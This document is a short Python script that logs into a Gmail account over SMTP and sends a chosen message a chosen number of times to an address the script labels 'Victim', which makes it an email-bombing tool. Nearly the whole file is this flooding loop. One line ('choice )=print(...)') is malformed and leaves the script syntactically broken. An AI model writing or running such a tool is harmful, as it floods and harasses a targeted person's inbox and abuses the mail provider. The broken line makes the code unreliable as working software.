import smtplib
import sys, os
from getpass import getpass

#CONNECTING
server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

#LOGIN
def login():
    global em
    global psw

    em = input("Email: ")
    psw = getpass("Password: ")
    
    try:
        server.login(em, psw)
    except Exception as e:
        print(f"Unexpected error \n\n{e}")
        ch = input("Retry?S/n")
        if ch.lower() == "s":
            login()
        else:
            server.quit()
            sys.exit()
login()
vit = input("Victim: ")
nmail = int(input("Number of emails: "))
obj = input("Object: ")
msg = input("Message: ")
message = f"""\
Subject: {obj}

{msg}"""
def bot():
    try:
        for i in range(nmail):
            server.sendmail(em,vit,message)
            print(f"Email sent: {i+1}/{nmail}")
        choice )=print("""
    Select one of this options:
        1 Restart the program.
        2 Choose another number of email with same credentials.
        3 Quit.
    """)

    

    except Exception as e:
        print(f"Unexpected error:\n\n{e}")
bot()
